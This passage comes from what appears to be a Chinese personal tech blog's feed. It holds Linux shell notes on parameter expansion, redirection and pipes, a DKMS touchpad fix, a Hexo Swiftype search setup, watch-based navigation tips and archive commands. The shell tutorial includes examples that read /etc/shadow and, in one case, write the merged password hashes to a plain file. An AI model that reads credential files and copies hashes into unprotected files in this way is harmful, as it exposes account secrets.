<p><code>#/##</code> 从左往右删除最短/最长一条<br><code>%,%%</code>和#一样,不过是从右往左<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#root权限,没有:的情况下</span></span><br><span class="line">mailtest=<span class="variable">$MAIL</span></span><br><span class="line"><span class="comment">#删除顶级目录</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;mailtest#/*/&#125;</span></span><br><span class="line"><span class="comment">#删除末级目录</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;mailtest%/*&#125;</span></span><br><span class="line"><span class="comment">#有:情况下</span></span><br><span class="line">path=<span class="variable">$PATH</span></span><br><span class="line"><span class="comment">#只保留第一个环境</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;path%%:*&#125;</span></span><br><span class="line"><span class="comment">#只保留最后一个环境</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;path1##*:&#125;</span></span><br></pre></td></tr></table></figure></p>
</blockquote>
<p><strong>0x2</strong> 替换</p>
<ol>
<li>直接替换<blockquote>
<p>${变量/oldWord/newWord}</p>
</blockquote>
</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#只替换首个</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;path/sbin/SBIN&#125;</span></span><br><span class="line"><span class="comment">#全局替换</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$&#123;path//sbin/SBIN&#125;</span></span><br></pre></td></tr></table></figure>
<ol>
<li>判断型替换<br><code>:-</code>判断USERNAME变量是否存在,不存在则创建变量并赋值为a1exlism(只有-的情况下在变量为空状态无法赋值)<blockquote>
<p>USERNAME=${USERNAME:-a1exlism}</p>
</blockquote>
</li>
</ol>
<h2 id="历史命令"><a href="#历史命令" class="headerlink" title="历史命令"></a>历史命令</h2><h3 id="查询历史命令"><a href="#查询历史命令" class="headerlink" title="查询历史命令"></a>查询历史命令</h3><p>前面提到<code>~/.bash_history</code>,history则是读取</p>
<blockquote>
<p>history [n]  最近n条<br>history [-c]  清除历史<br>history [-raw]  读取/添加/写入histfiles(添加和写入感觉一模一样..)</p>
</blockquote>
<h3 id="执行历史命令"><a href="#执行历史命令" class="headerlink" title="执行历史命令"></a>执行历史命令</h3><p>!n !command 就不讲了</p>
<blockquote>
<p><code>!!</code>执行上一条命令</p>
</blockquote>
<h2 id="数据流重定向"><a href="#数据流重定向" class="headerlink" title="数据流重定向"></a>数据流重定向</h2><p>顾名思义,数据放入了一个缓冲区,看到重定向符号就将数据转移</p>
<h3 id="gt-gt-gt-lt-lt-lt-描述"><a href="#gt-gt-gt-lt-lt-lt-描述" class="headerlink" title="&gt; &gt;&gt; &lt;&lt; &lt;描述"></a>&gt; &gt;&gt; &lt;&lt; &lt;描述</h3><p>单个字符==&gt;替换<br>双字符===&gt;累加<br>和c++一样&gt;输出,&lt;输入<br>代码:0输入 1输出 2错误输出</p>
<p>栗子:</p>
<h3 id="gt-gt-gt-区别"><a href="#gt-gt-gt-区别" class="headerlink" title="&gt;  &gt;&gt;区别"></a>&gt;  &gt;&gt;区别</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#将ll内容输出至rootfile,terminal不显示</span></span><br><span class="line">a1exlism@dell:~$ ll / &gt; /tmp/rootfile</span><br><span class="line"><span class="comment">#用&gt;&gt;将~的内容累加至rootfile</span></span><br><span class="line">a1exlism@dell:~$ ll ~ &gt;&gt; /tmp/rootfile </span><br><span class="line"><span class="comment">#符号&gt;将rootfile进行重写,原先的内容全部消失</span></span><br><span class="line">a1exlism@dell:~$ ll / &gt; /tmp/rootfile</span><br></pre></td></tr></table></figure>
<h3 id="错误输出"><a href="#错误输出" class="headerlink" title="错误输出"></a>错误输出</h3><p>涉及到前面提到的代码–<br><strong>0x1</strong>. stdout输出至file1,stderr输出至file2</p>
<blockquote>
<p>find / -name *.desktop &gt;file1 2&gt;file2</p>
</blockquote>
<p><strong>0x2</strong>. 丢弃错误数据==&gt;放到<code>黑洞</code>设备<code>/dev/null</code></p>
<blockquote>
<p>find / -name *.desktop &gt;file1 2&gt;/dev/null</p>
</blockquote>
<p><strong>0x3</strong>. 将错误正确数据分开放入同一个文件</p>
<blockquote>
<p><code>1.</code>find / -name <em>.desktop &gt; file 2&gt;&gt; file =, =<br><code>2.</code>find / -name </em>.desktop &gt; file 2&gt;&amp;1  这个表示不理解,放弃</p>
</blockquote>
<h3 id="标准输入"><a href="#标准输入" class="headerlink" title="标准输入"></a>标准输入</h3><p><strong>0x1</strong>. 栗子<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#cat 创建文件</span></span><br><span class="line">cat catfile</span><br><span class="line">stdin</span><br><span class="line">Ctrl+D</span><br><span class="line"><span class="comment">#利用文件写入</span></span><br><span class="line">cat &gt; catfile &lt; ~/.bash_<span class="built_in">history</span></span><br><span class="line">diff ~/.bash_<span class="built_in">history</span> catfile  <span class="comment">#无输出</span></span><br></pre></td></tr></table></figure></p>
<p><strong>0x2</strong>. &lt;&lt;为结束字符</p>
<blockquote>
<p>cat &gt; catfile &lt;&lt; “EOF”</p>
</blockquote>
<h3 id="命令判断"><a href="#命令判断" class="headerlink" title="命令判断"></a>命令判断</h3><p>&amp;&amp;   两者为<code>同或</code>关系,a1-&gt;b1,a0-&gt;b0<br>||    两者为<code>异或</code>关系,a1-&gt;b0,a0-&gt;b1<br>执行顺序为<code>从左到右</code>的顺序执行<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#不清楚/tmp/abc的存在,直接创建/tmp/abc/def文件</span></span><br><span class="line">ls /tmp/abc || mkdir -p /tmp/abc &amp;&amp; touch /tmp/abc/def</span><br><span class="line"><span class="comment">#ls 报错是因为判断是在创建之前..</span></span><br></pre></td></tr></table></figure></p>
<h2 id="管道Pipe"><a href="#管道Pipe" class="headerlink" title="管道Pipe"></a>管道Pipe</h2><p><code>|</code> 类似于重定向将标准<code>输出</code>以某种方式输出</p>
<blockquote>
<p>ll / | less</p>
</blockquote>
<h3 id="选取命令"><a href="#选取命令" class="headerlink" title="选取命令"></a>选取命令</h3><h4 id="cut"><a href="#cut" class="headerlink" title="cut"></a>cut</h4><blockquote>
<p>cut -d ‘words’ -f number / cut -c 字符范围</p>
</blockquote>
<p>example:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#功能和js的split函数一样,以-d的分隔符分成数组,选取组号</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span> | cut <span class="_">-d</span> : <span class="_">-f</span> 2 <span class="comment">#-d delimiter -f fields</span></span><br><span class="line"><span class="comment">#取所有行第12个字符之后的内容</span></span><br><span class="line"><span class="built_in">export</span> &gt; file1</span><br><span class="line"><span class="built_in">export</span> | cut -c 12- &gt;file2 <span class="comment">#-c character</span></span><br><span class="line"><span class="comment">#比较一下</span></span><br><span class="line">colordiff [-c] file1 file2 <span class="comment"># -c 为比较所有内容</span></span><br></pre></td></tr></table></figure></p>
<h4 id="grep"><a href="#grep" class="headerlink" title="grep"></a>grep</h4><p>这部分放在了<a href="http://a1exlism.github.io/10/14/2015/bash1/" target="_blank" rel="external">Linux 查询</a>中</p>
<h3 id="排序命令"><a href="#排序命令" class="headerlink" title="排序命令"></a>排序命令</h3><h4 id="sort"><a href="#sort" class="headerlink" title="sort"></a>sort</h4><blockquote>
<p>sort [-option] file</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#默认字母排序</span></span><br><span class="line">cat /etc/passwd | sort</span><br><span class="line"><span class="comment">#以每行第三个作为排序依据</span></span><br><span class="line">cat /etc/passwd | sort -t : -k 3  <span class="comment">#-t --field separator -k key(location)-t --field separator -k key(location)</span></span><br><span class="line"><span class="comment">#cut + sort</span></span><br><span class="line">last | cut <span class="_">-d</span> <span class="string">' '</span> <span class="_">-f</span> 1 | sort</span><br></pre></td></tr></table></figure>
<h4 id="uniq"><a href="#uniq" class="headerlink" title="uniq"></a>uniq</h4><p>-i 忽略大小写 -c count</p>
<blockquote>
<p>uniq [-ic]</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#记录独立用户登陆,依名字排序并统计次数</span></span><br><span class="line">last | cut <span class="_">-d</span> <span class="string">' '</span> <span class="_">-f</span> 1 | sort | uniq -c</span><br></pre></td></tr></table></figure>
<h4 id="wc"><a href="#wc" class="headerlink" title="wc"></a>wc</h4><p>word count字数统计 -l行 -w字 -m字符</p>
<blockquote>
<p>wc [-lwm]</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#记录登陆系统的总人次 grep1排除空白行 grep2排除wtmp</span></span><br><span class="line">last | grep [a-zA-Z] | grep -v wtmp | wc <span class="_">-l</span></span><br></pre></td></tr></table></figure>
<h3 id="双向重定向"><a href="#双向重定向" class="headerlink" title="双向重定向"></a>双向重定向</h3><p>tee -&gt; T 两边都行(stdout+file) -a appand添加(否则覆盖)</p>
<blockquote>
<p>tee [-a] file</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#存入文件file并在屏幕以less方式显示</span></span><br><span class="line">cat /var/<span class="built_in">log</span>/kern.log | tee /tmp/<span class="built_in">test</span>Floder/file | less</span><br></pre></td></tr></table></figure>
<h3 id="字符转换"><a href="#字符转换" class="headerlink" title="字符转换"></a>字符转换</h3><h4 id="tr"><a href="#tr" class="headerlink" title="tr"></a>tr</h4><p>translate or remove<br>[option]: -d delete -s squeeze-replace</p>
<blockquote>
<p>tr [-ds] string</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#切换大写</span></span><br><span class="line">last | tr <span class="_">-s</span> [a-z] [A-Z]</span><br><span class="line"><span class="comment">#删除冒号</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span> | tr <span class="_">-d</span> :</span><br></pre></td></tr></table></figure>
<h3 id="数据合并"><a href="#数据合并" class="headerlink" title="数据合并"></a>数据合并</h3><h4 id="join"><a href="#join" class="headerlink" title="join"></a>join</h4><p>-t 分隔 -i 无视大小写 <code>-1 n</code> 文件1用第n个字段进行分析</p>
<blockquote>
<p>join [-ti12] file1 file2</p>
</blockquote>
<p>join之前一般需要<code>sort</code>一下<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#合并passwd和shadow数据,stdout之后并记录在test文件中</span></span><br><span class="line">join -t : /etc/passwd /etc/shadow |tee <span class="built_in">test</span></span><br><span class="line"><span class="comment">#先看看相同之处</span></span><br><span class="line">head -n 3 /etc/passwd /etc/group  <span class="comment">#相同之处在file1第四个字段和file2的第三个字段</span></span><br><span class="line"><span class="comment">#文件1以第四个字段GID作为分析内容</span></span><br><span class="line">join -t : -1 4 /etc/passwd -2 3 /etc/group</span><br></pre></td></tr></table></figure></p>
<p>合并后的输出第一字段为相同字段,后面不重复显示</p>
<h4 id="paste"><a href="#paste" class="headerlink" title="paste"></a>paste</h4><p>数据直接黏贴,[tab]作为分隔符</p>
<blockquote>
<p>paste /etc/passwd /etc/shadow</p>
</blockquote>
<h3 id="切割-合成"><a href="#切割-合成" class="headerlink" title="切割/合成"></a>切割/合成</h3><h4 id="split"><a href="#split" class="headerlink" title="split"></a>split</h4><p>-b –bytes 可加单位 -l line number</p>
<blockquote>
<p>split [-bl] file PreFix</p>
</blockquote>
<h4 id="cat"><a href="#cat" class="headerlink" title="cat"></a>cat</h4><p>利用数据流重定向</p>
<blockquote>
<p>cat files* &gt;&gt; file</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 200M文件切割成四份,每份60M--videos会被分成四部分,只有第一个能看,也不能调进度</span></span><br><span class="line"><span class="built_in">cd</span> /tmp/<span class="built_in">test</span>Floder; split -b 60m ~/Downloads/video.rmvb videos </span><br><span class="line"><span class="comment"># 合并上述文件</span></span><br><span class="line">cat videos* &gt;&gt; viedo.rmvb <span class="comment">#确实很棒 数据流重定向</span></span><br></pre></td></tr></table></figure>
<h3 id="参数代换"><a href="#参数代换" class="headerlink" title="参数代换"></a>参数代换</h3><p><code>xargs</code>为不支持管道符号的command提供了额外的支持<br>-0 特殊字符格式化 -e EOF符 n 次数</p>
<blockquote>
<p>xargs [-0epn] command</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#查询前三个账户并用echo来显示 (栗子不怎么恰当,不过原书finger的栗子已失效)</span></span><br><span class="line">cut <span class="_">-d</span> : <span class="_">-f</span> 1 /etc/passwd | head -n 3 |xargs <span class="built_in">echo</span> </span><br><span class="line"><span class="comment">#echo5个账号,第三个账号为bin,xargs以'bin'作为EOF标识</span></span><br><span class="line">cut <span class="_">-d</span> : <span class="_">-f</span> 1 /etc/passwd | xargs -n 5 <span class="_">-e</span> <span class="string">'bin'</span> <span class="built_in">echo</span> <span class="comment">#注意-e'bin'连在一起</span></span><br></pre></td></tr></table></figure>
<h3 id="减号"><a href="#减号" class="headerlink" title="减号-"></a>减号<code>-</code></h3><p>在一条命令中(管道符隔开),前面的stdout作为后面的stdin(变量存储)<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 类似于匿名函数,减少了文件名的产生</span></span><br><span class="line">tar -cvf - /tmp/<span class="built_in">test</span>Floder/ | tar -xvf -</span><br></pre></td></tr></table></figure></p>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p>《鸟哥私房菜》</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[linux-触摸板失效解决]]></title>
      <url>http://csser.work/02/13/2016/linux-hard-elanTouchpad/</url>
      <content type="html"><![CDATA[<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>触摸板开启状态下开机,碰到触摸板任何按键均失效,只有外接鼠标有效,使用笔记本内置快捷键进行休眠重新开机恢复,但是触摸板已经没卵用了</p>
<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">a1exlism@dell~$ uname -r</span><br><span class="line">3.19.0-49-generic</span><br><span class="line">a1exlism@dell:~$ lsb_release <span class="_">-a</span></span><br><span class="line">No LSB modules are available.</span><br><span class="line">Distributor ID: Ubuntu</span><br><span class="line">Description:  Ubuntu 15.04</span><br><span class="line">Release:  15.04</span><br><span class="line">Codename: vivid</span><br></pre></td></tr></table></figure>
<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="适用于任何笔记本"><a href="#适用于任何笔记本" class="headerlink" title="适用于任何笔记本"></a>适用于任何笔记本</h3><blockquote>
<p><a href="http://forum.ubuntu.org.cn/viewtopic.php?f=42&amp;t=304955" target="_blank" rel="external">Sony Vaio 触摸板不能识别解决办法</a><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. sudo vi /etc/default/grub</span><br><span class="line">2. 找到GRUB_CMDLINE_LINUX=<span class="string">""</span> 添加 i8042.reset i8042.nomux i8042.nopnp i8042.noloop </span><br><span class="line"><span class="comment">#添加完后GRUB_CMDLINE_LINUX="i8042.reset i8042.nomux i8042.nopnp i8042.noloop"</span></span><br><span class="line">3. sudo update-grub</span><br><span class="line">4. sudo reboot</span><br></pre></td></tr></table></figure></p>
</blockquote>
<p>通过更改grub设置,加载内核过程中会将触摸板简单的识别成<code>鼠标</code>设备,即丧失了多指触摸功能  </p>
<h3 id="elanTouchpad方案-推荐"><a href="#elanTouchpad方案-推荐" class="headerlink" title="elanTouchpad方案[推荐]"></a>elanTouchpad方案[推荐]</h3><p>感觉不支持的应该都是这家<code>Elan</code>触摸板了= =<br>From–&gt;<a href="http://www.evilcodingmonkey.com/2014/01/23/ubuntu-activate-multi-touch-on-elantech/" target="_blank" rel="external">evilcodingmonkey</a></p>
<p>1.</p>
<blockquote>
<p>cat /proc/bus/input/devices | grep “Name=”  </p>
</blockquote>
<p>应该能看到这个–&gt; N: Name=”ETPS/2 Elantech Touchpad”  </p>
<p>2.<br>下载<a href="https://bugs.launchpad.net/ubuntu/+source/linux/+bug/1166442/+attachment/3941591/+files/psmouse-elantech-x551c.tar.gz" target="_blank" rel="external">this archive</a>(from Ubuntu’s bug reporting page)<br>//国内可以用<a href="http://pan.baidu.com/s/1kTOOlE3" target="_blank" rel="external">百度云</a></p>
<p>3.</p>
<blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/Downloads</span><br><span class="line">sudo dkms ldtarball psmouse-elantech-x551c.tar.gz</span><br><span class="line">sudo dkms install -m psmouse -v elantech-x551c</span><br><span class="line">sudo rmmod psmouse</span><br><span class="line">sudo modprobe psmouse</span><br></pre></td></tr></table></figure>
</blockquote>
<p>End. 重启之后就没事啦</p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="http://www.evilcodingmonkey.com/2014/01/23/ubuntu-activate-multi-touch-on-elantech/" target="_blank" rel="external">ubuntu-activate-multi-touch-on-elantech-evilcodingmonkey</a><br><a href="http://forum.ubuntu.org.cn/viewtopic.php?f=42&amp;t=304955" target="_blank" rel="external">Sony Vaio 触摸板不能识别解决办法-UbuntuForum</a><br>想了解DKMS可以看看这个-&gt;<a href="http://www.cnblogs.com/wwang/archive/2011/06/21/2085571.html" target="_blank" rel="external">DKMS简介</a></p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>发现重启几次之后触摸板又挂了<br>发现dkms安装了但并没有加载,所以开机自启加载两句话= =<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sudo vi /etc/rc.local 在这里添加下面两条内容</span></span><br><span class="line">sudo rmmod psmouse</span><br><span class="line">sudo modprobe psmouse</span><br></pre></td></tr></table></figure></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Hexo站内搜索]]></title>
      <url>http://csser.work/02/08/2016/hexo-search/</url>
      <content type="html"><![CDATA[<h2 id="主题环境"><a href="#主题环境" class="headerlink" title="主题环境"></a>主题环境</h2><p>hexo 3.0<br><a href="https://github.com/wuchong/jacman" target="_blank" rel="external">jacman</a>修改于pacman(基本差不多)</p>
<p>以前使用的<code>Tinyso</code>(微搜),不过这几个月已经无限502-504了,看了一下官方博客,好像从2015就没维护了..放弃换成<code>Swiftype</code>,15天free trial 网上查了一下好像过期不影响站内搜索,如果失效就更新..<br>–FreeTrail 过后测试正常,SwiftSearch可放心食用</p>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><h4 id="Swiftype"><a href="#Swiftype" class="headerlink" title="Swiftype"></a>Swiftype</h4><p>1.注册账号-&gt;<a href="https://swiftype.com" target="_blank" rel="external">Swiftype</a><br>2.create engine(search engine,名字随便取) -&gt; 填入自己的URL验证<br>3.My Search Engines -&gt; <img src="/imgs/hexoSearch/hexoSearch1.png" alt="1"><br><img src="/imgs/hexoSearch/hexoSearch2.png" alt="2"><br>4.记下以下的class名.<br><img src="/imgs/hexoSearch/hexoSearch3.png" alt="3"></p>
<h4 id="文件修改"><a href="#文件修改" class="headerlink" title="文件修改"></a>文件修改</h4><ol>
<li><p>/yourOwnPath/hexo/themes/jacman/<code>_config.yml</code>末尾</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">swift_search:</span><br><span class="line">  <span class="built_in">enable</span>: <span class="literal">true</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>创建文件/yourOwnPath/hexo/themes/jacman/layout/_partial/<code>swift_search.ejs</code></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//将调用的代码复制进去</span></span><br><span class="line">&lt;% <span class="keyword">if</span> (theme.swift_search.enable)&#123; %&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="javascript"></span><br><span class="line">  (<span class="function"><span class="keyword">function</span>(<span class="params">w,d,t,u,n,s,e</span>)</span>&#123;w[<span class="string">'SwiftypeObject'</span>]=n;w[n]=w[n]||<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  (w[n].q=w[n].q||[]).push(<span class="built_in">arguments</span>);&#125;;s=d.createElement(t);</span><br><span class="line">  e=d.getElementsByTagName(t)[<span class="number">0</span>];s.async=<span class="number">1</span>;s.src=u;e.parentNode.insertBefore(s,e);</span><br><span class="line">  &#125;)(<span class="built_in">window</span>,<span class="built_in">document</span>,<span class="string">'script'</span>,<span class="string">'//s.swiftypecdn.com/install/v2/st.js'</span>,<span class="string">'_st'</span>);</span><br><span class="line">  </span><br><span class="line">  _st(<span class="string">'install'</span>,<span class="string">'6CrKq4WqLzE2qozYG7T_'</span>,<span class="string">'2.0.0'</span>);</span><br><span class="line"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">&lt;% &#125; %&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>/yourOwnPath/hexo/themes/jacman/layout/_partial/<code>header.ejs</code></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//将该html代码插入在google_cse之前,不然报错..</span></span><br><span class="line"><span class="comment">//action可以模仿其他search写法,默认本页面显示</span></span><br><span class="line">&lt;% <span class="keyword">if</span>(theme.swift_search.enable)&#123; %&gt;</span><br><span class="line">            <span class="xml"><span class="tag">&lt;<span class="name">form</span> <span class="attr">class</span>=<span class="string">"search"</span> <span class="attr">action</span>=<span class="string">""</span> <span class="attr">method</span>=<span class="string">"get"</span> <span class="attr">accept-charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">class</span>=<span class="string">"st-default-search-input"</span> <span class="attr">style</span>=<span class="string">"webkit-border-radius: 0;border-radius: 0;"</span> <span class="attr">placeholder</span>=<span class="string">"Search"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">%</span> &#125; //根据后面的<span class="attr">if</span> <span class="attr">else</span>结构完成闭合</span></span></span><br></pre></td></tr></table></figure>
</li>
<li><p>/yourOwnPath/hexo/themes/jacman/layout/_partial/<code>after_footer.ejs</code></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//最后添加如下代码,使swift_search.ejs文件生效</span></span><br><span class="line">&lt;!-- Swift_search Begin --&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%-</span> <span class="attr">partial</span>('<span class="attr">swift_search</span>') %&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- Tiny_search End --&gt;</span></span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<h4 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h4><p>hexo g;hexo s<br>测试是否成功<br>默认应该和本blog一样的效果</p>
<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><a href="http://www.jianshu.com/p/2010ad07d960" target="_blank" rel="external">Hexo静态博客添加站内搜索–Swiftype</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[手表指南方法]]></title>
      <url>http://csser.work/01/31/2016/life-%E6%8C%87%E5%8D%97/</url>
      <content type="html"><![CDATA[<p>看小学生杀手的时候发现几个指南方法，记一下</p>
<h2 id="借助太阳指向"><a href="#借助太阳指向" class="headerlink" title="借助太阳指向"></a>借助太阳指向</h2><p>当地时间<code>/2</code>，表盘中将得到的数字指向太阳，则<code>12点钟方向</code>就是北</p>
<p>###原理<br>一天内地球自转一圈，12时制的手表重复两边，时间除二就是为了<code>同步自转和表盘指针</code></p>
<p>不过太阳在头上和没太阳的情况这种方法就没什么卵用了。</p>
<h2 id="立杆测影-指东针"><a href="#立杆测影-指东针" class="headerlink" title="立杆测影-指东针"></a>立杆测影-指东针</h2><p>直杆垂直插在地面上，在影子顶点作下<code>标记A</code>，15分钟之后，影子变化，将变化后的影子顶点记为<code>标记B</code>，ab即为<code>西-&gt;东</code>方向（北半球）。</p>
<h3 id="日晷原理"><a href="#日晷原理" class="headerlink" title="日晷原理"></a>日晷原理</h3><p>因为我们身处北半球，北半球自西向东自转，以北半球上为参考点，太阳由东向西照射。<br>影子经过竿的遮挡，方向和太阳照射相反，所以北半球AB方向为 <code>西-&gt;东</code><br>南半球<code>东-&gt;西</code>    （反反之后和自转方向相同了=, =）</p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="http://education.news.cn/2012-08/23/c_123618168.htm" target="_blank" rel="external">新华网</a><br><a href="http://www.dili360.com/nh/article/p5350c3d8d9f9e10.htm" target="_blank" rel="external">国家地理</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[linux日常更新-01]]></title>
      <url>http://csser.work/01/31/2016/daily-linux-1/</url>
      <content type="html"><![CDATA[<p>#环境:debian8<br>最后更新日期:2016-01-31</p>
<h2 id="Commond"><a href="#Commond" class="headerlink" title="Commond"></a>Commond</h2><h3 id="压缩包"><a href="#压缩包" class="headerlink" title="压缩包"></a>压缩包</h3><h4 id="压缩"><a href="#压缩" class="headerlink" title="压缩"></a>压缩</h4><p>1.<em>.tar 用tar -cvf FILE.tar DIR 压缩<br>2.</em>.gz 用 gzip FILE 压缩<br>3.<em>.tar.gz 和 .tgz 用 tar -zcvf FILE.tar.gz DIR 压缩<br>4.</em>.bz2 用 bzip2 -z FILE 压缩<br>5.<em>.tar.bz2 用 tar -jcvf FILE.tar.bz2 DIR 压缩<br>6.</em>.Z 用 compress FILE 压缩<br>7.<em>.tar.Z 用 tar -zcvf FILE.tar.z DIR 压缩<br>8.</em>.rar 用 rar a FILE.rar DIR 压缩<br>9.*.zip 用 zip FILE.zip DIR 压缩</p>
<h4 id="解压"><a href="#解压" class="headerlink" title="解压"></a>解压</h4><ol>
<li>*.tar 用 tar –xvf 解压 </li>
<li>*.gz 用 gzip -d或者gunzip 解压 </li>
<li><em>.tar.gz和</em>.tgz 用 tar –xzf 解压 </li>
<li>*.bz2 用 bzip2 -d或者用bunzip2 解压 </li>
<li>*.tar.bz2用tar –xjf 解压 </li>
<li>*.Z 用 uncompress 解压 </li>
